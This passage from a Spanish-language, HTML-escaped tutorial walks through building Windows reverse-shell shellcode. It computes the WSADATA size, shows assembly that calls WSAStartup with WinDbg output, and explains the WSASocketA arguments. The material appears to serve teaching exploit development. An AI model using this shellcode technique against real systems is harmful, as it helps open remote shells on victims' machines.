&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-block z-c++&quot;&gt;&lt;span class=&quot;z-meta z-preprocessor z-c++&quot;&gt;&lt;span class=&quot;z-keyword z-control z-import z-c++&quot;&gt;#endif&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-block z-c++&quot;&gt;&lt;span class=&quot;z-meta z-preprocessor z-c++&quot;&gt;&lt;span class=&quot;z-keyword z-control z-import z-c++&quot;&gt;#else&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-block z-c++&quot;&gt;    &lt;span class=&quot;z-storage z-type z-c&quot;&gt;unsigned&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-c&quot;&gt;short&lt;&#x2F;span&gt; iMaxUdpDg&lt;span class=&quot;z-punctuation z-terminator z-c++&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-block z-c++&quot;&gt;&lt;span class=&quot;z-meta z-preprocessor z-c++&quot;&gt;&lt;span class=&quot;z-keyword z-control z-import z-c++&quot;&gt;#endif&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-block z-c++&quot;&gt;&lt;span class=&quot;z-meta z-preprocessor z-c++&quot;&gt;&lt;span class=&quot;z-keyword z-control z-import z-c++&quot;&gt;#else&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-block z-c++&quot;&gt;    &lt;span class=&quot;z-storage z-type z-c&quot;&gt;char&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-c&quot;&gt;*&lt;&#x2F;span&gt;lpVendorInfo&lt;span class=&quot;z-punctuation z-terminator z-c++&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-block z-c++&quot;&gt;&lt;span class=&quot;z-meta z-preprocessor z-c++&quot;&gt;&lt;span class=&quot;z-keyword z-control z-import z-c++&quot;&gt;#endif&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-block z-c++&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-block z-end z-c++&quot;&gt;}&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-entity z-name z-type z-typedef z-c++&quot;&gt;WSADATA&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-terminator z-c++&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Al revisar la definición de la estructura y la información en el sitio web de Microsoft, observamos que algunos de los miembros ya no se utilizan si la versión es superior a “2.0”.&lt;&#x2F;p&gt;
&lt;p&gt;Si bien la mayoría de los campos tienen longitudes definidas, hay un par que siguen siendo problemáticos, como los campos &lt;code&gt;szDescription&lt;&#x2F;code&gt; y &lt;code&gt;szSystemStatus&lt;&#x2F;code&gt; .&lt;&#x2F;p&gt;
&lt;p&gt;Según la documentación oficial, &lt;code&gt;szDescription&lt;&#x2F;code&gt; puede tener una longitud máxima de 257 (&lt;code&gt;WSADESCRIPTION_LEN&lt;&#x2F;code&gt;, que es 256 más el terminador de cadena nula).&lt;&#x2F;p&gt;
&lt;p&gt;Sin embargo, no se menciona la longitud de &lt;code&gt;szSystemStatus&lt;&#x2F;code&gt;.Hay dos maneras de determinar la longitud de este campo. Podríamos codificar el socket en C y luego inspeccionar la estructura dentro de WinDbg, o podríamos usar recursos en línea para determinar el tamaño de este campo. Uno de los recursos más confiables para obtener esta información es el código fuente de &lt;strong&gt;ReactOS&lt;&#x2F;strong&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;em&gt;ReactOS es un sistema operativo de código abierto diseñado para ejecutar software y controladores de Windows.&lt;&#x2F;em&gt;&lt;&#x2F;p&gt;
&lt;p&gt;El código fuente de ReactOS nos dice que la longitud máxima del campo szSystemStatus es 129 (&lt;code&gt;WSASYS_STATUS_LEN&lt;&#x2F;code&gt;, que es 128 más el terminador nulo).&lt;&#x2F;p&gt;
&lt;p&gt;Aunque desconocemos el tamaño exacto de la estructura, sabemos que solo estos dos campos (&lt;code&gt;szDescription&lt;&#x2F;code&gt; y &lt;code&gt;szSystemStatus&lt;&#x2F;code&gt;) pueden ocupar un máximo de &lt;code&gt;0x182&lt;&#x2F;code&gt; bytes. Considerando los demás campos de la estructura, que tienen tamaños definidos, podemos calcular la longitud máxima de la estructura usando WinDbg:&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; ? 0x2 + 0x2 + 0x2 + 0x2 + 0x4 + 0n256 + 0n1 + 0n128 + 0n1
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Evaluate expression: 398 = 0000018e
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Debido a que el tamaño de esta estructura es mayor que el espacio que actualmente reservamos en la pila como parte de la función de inicio , necesitamos modificar nuestro shellcode y restar un valor más alto de ESP para tener en cuenta el tamaño de la estructura.&lt;&#x2F;p&gt;
&lt;p&gt;Después de repasar los argumentos que necesitamos proporcionar a la API WSAStartup y determinar el tamaño de la estructura que utiliza, actualicemos nuestro shellcode e intentemos llamarlo.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python z-code&quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-comment z-block z-documentation z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-begin z-python&quot;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-comment z-block z-documentation z-python&quot;&gt;0:004&amp;gt; ? 0xfffff9f0
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-comment z-block z-documentation z-python&quot;&gt;Evaluate expression: -1552 = fffff9f0
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-comment z-block z-documentation z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-end z-python&quot;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;start:&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;int3;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;mov ebp, esp;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;                 
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;add esp, 0xfffff9f0;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;     
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Llamada a &lt;code&gt;WSAStartup&lt;&#x2F;code&gt;:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python z-code&quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;call_wsastartup:&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;mov eax, esp;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;                  &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Mueve ESP a EAX
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;mov cx, 0x590;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;                 &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Mueve 0x590 a CX
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;sub eax, ecx;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;                  &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Resta CX de EAX para evitar sobrescribir despues
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;push eax;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;                      &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Inserta lpWSAData
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;xor eax, eax;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;                  &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Null EAX
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;mov ax, 0x0202;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;                &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; mueve la version to AX
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;push eax;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;                      &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Insertar wVersionRequired
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;call dword ptr [ebp+0x20];&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;     &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; llamar WSAStartup
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;La función &lt;code&gt;call_wsastartup&lt;&#x2F;code&gt; que se muestra en el snippet anterior comienza moviendo la dirección de memoria de ESP, que usamos como ubicación de almacenamiento para nuestros símbolos resueltos, al registro EAX.&lt;&#x2F;p&gt;
&lt;p&gt;A continuación, encontramos una instrucción MOV que almacena el valor 0x590 en el registro CX. Después, encontramos una instrucción SUB que resta el valor de ECX (0x590) de EAX.&lt;&#x2F;p&gt;
&lt;p&gt;Como parte de la llamada a WSAStartup, la API rellenará la estructura WSADATA que se encuentra actualmente en la pila. Por ello, debemos asegurarnos de que las instrucciones posteriores del shellcode no sobrescriban el contenido de esta estructura.&lt;&#x2F;p&gt;
&lt;p&gt;Una forma de lograrlo es restar un valor arbitrario (&lt;code&gt;0x590&lt;&#x2F;code&gt;) del puntero de la pila y usarlo como almacenamiento para la estructura.&lt;&#x2F;p&gt;
&lt;p&gt;Tras la operación SUB, insertaremos EAX en la pila. La siguiente instrucción XOR pondrá a cero EAX y moveremos el valor 0x0202 al registro AX para que actúe como argumento &lt;code&gt;wVersionRequired&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Finalmente, podemos enviar este argumento a la pila y llamar a &lt;code&gt;WSAStartup&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; g
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Breakpoint 0 hit
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eax=00000202 ebx=77350000 ecx=00000590 edx=00d90000 esi=029b0030 edi=00d923e8
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eip=029b00d2 esp=02baf438 ebp=02bafa6c iopl=0         nv up ei pl zr na pe nc
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;029b00d2 ff5520          call    dword ptr [ebp+20h]  ss:0023:02bafa8c={WS2_32!WSAStartup (77359cc0)}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; dds esp l2
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;02baf438  00000202
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;02baf43c  02baeeb0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; p
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eax=00000000 ebx=77350000 ecx=31ea8e31 edx=00000202 esi=029b0030 edi=00d923e8
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eip=029b00d5 esp=02baf440 ebp=02bafa6c iopl=0         nv up ei pl zr na pe nc
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;029b00d5 0000            add     byte ptr [eax],al          ds:0023:00000000=??
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Como podemos ver en el snippet anterior, el código de salida en EAX es 0, lo que confirma que ha tenido éxito.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;llamada-a-wsasocketa&quot;&gt;LLamada a WSASocketA&lt;a class=&quot;zola-anchor&quot; href=&quot;#llamada-a-wsasocketa&quot; aria-label=&quot;Anchor link for: llamada-a-wsasocketa&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;Ahora necesitamos invocar a la api &lt;code&gt;WSASocketA&lt;&#x2F;code&gt;, la estructura es la siguiente:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;cpp&quot; class=&quot;language-cpp z-code&quot;&gt;&lt;code class=&quot;language-cpp&quot; data-lang=&quot;cpp&quot;&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;SOCKET WSAAPI &lt;span class=&quot;z-meta z-function z-c++&quot;&gt;&lt;span class=&quot;z-meta z-toc-list z-full-identifier z-c++&quot;&gt;&lt;span class=&quot;z-entity z-name z-function z-c++&quot;&gt;WSASocketA&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-c++&quot;&gt;&lt;span class=&quot;z-meta z-group z-c++&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-begin z-c++&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-c++&quot;&gt;&lt;span class=&quot;z-meta z-group z-c++&quot;&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-function z-parameters z-c++&quot;&gt;&lt;span class=&quot;z-meta z-group z-c++&quot;&gt;    &lt;span class=&quot;z-storage z-type z-c&quot;&gt;int&lt;&#x2F;span&gt;                 &lt;span class=&quot;z-variable z-parameter z-c++&quot;&gt;af&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-c++&quot;&gt;,&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-function z-parameters z-c++&quot;&gt;&lt;span class=&quot;z-meta z-group z-c++&quot;&gt;    &lt;span class=&quot;z-storage z-type z-c&quot;&gt;int&lt;&#x2F;span&gt;                 &lt;span class=&quot;z-variable z-parameter z-c++&quot;&gt;type&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-c++&quot;&gt;,&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-function z-parameters z-c++&quot;&gt;&lt;span class=&quot;z-meta z-group z-c++&quot;&gt;    &lt;span class=&quot;z-storage z-type z-c&quot;&gt;int&lt;&#x2F;span&gt;                 &lt;span class=&quot;z-variable z-parameter z-c++&quot;&gt;protocol&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-c++&quot;&gt;,&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-function z-parameters z-c++&quot;&gt;&lt;span class=&quot;z-meta z-group z-c++&quot;&gt;    LPWSAPROTOCOL_INFOA &lt;span class=&quot;z-variable z-parameter z-c++&quot;&gt;lpProtocolInfo&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-c++&quot;&gt;,&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-function z-parameters z-c++&quot;&gt;&lt;span class=&quot;z-meta z-group z-c++&quot;&gt;    GROUP               &lt;span class=&quot;z-variable z-parameter z-c++&quot;&gt;g&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-c++&quot;&gt;,&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-function z-parameters z-c++&quot;&gt;&lt;span class=&quot;z-meta z-group z-c++&quot;&gt;    &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;DWORD&lt;&#x2F;span&gt;               dwFlags
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-function z-parameters z-c++&quot;&gt;&lt;span class=&quot;z-meta z-group z-c++&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-end z-c++&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-terminator z-c++&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;El prototipo de la función revela que hay 6 argumentos necesarios para la llamada.&lt;&#x2F;p&gt;
&lt;p&gt;La mayoría de estos argumentos tienen tipos de datos familiares como INT y DWORD, pero también encontraremos algunos tipos de datos extraños dentro de los parámetros &lt;code&gt;lpProtocolInfo&lt;&#x2F;code&gt; y &lt;code&gt;g&lt;&#x2F;code&gt; que requieren una revisión adicional.&lt;&#x2F;p&gt;
&lt;p&gt;Comenzemos con el parámetro &lt;code&gt;af&lt;&#x2F;code&gt; que corresponde a la familia de direcciones que utiliza el socket, al explorar la documentación, vemos que corresponde a la familia de direcciones IPv4, que es la que se utilizará para nuestro shell inverso.&lt;&#x2F;p&gt;
&lt;p&gt;EL siguiente es &lt;code&gt;type&lt;&#x2F;code&gt;, el cuál definirá el tipo de socket. Nuestro shell inverso, utilizará el protocolo TCP por lo tanto debemos proporcionar como argumentos SOCK_STREAM.&lt;&#x2F;p&gt;
&lt;p&gt;Según la documentación oficial, el parámetro de protocolo se basa en los dos argumentos anteriores proporcionados a la función.&lt;&#x2F;p&gt;
&lt;p&gt;En nuestro caso, debe establecerse en IPPROTO_TCP.&lt;&#x2F;p&gt;
&lt;p&gt;Siguiendo con la revisión de la documentación oficial, el parámetro &lt;code&gt;lpProtocolInfo&lt;&#x2F;code&gt; parece requerir un puntero a la estructura &lt;code&gt;WSAPROTOCOL_INFO&lt;&#x2F;code&gt; . Antes de profundizar en esta estructura, es importante tener en cuenta que este parámetro puede establecerse en nulo (0x0). Si se establece en nulo, Winsock usará los primeros 249 que coincidan con nuestros otros parámetros.&lt;&#x2F;p&gt;
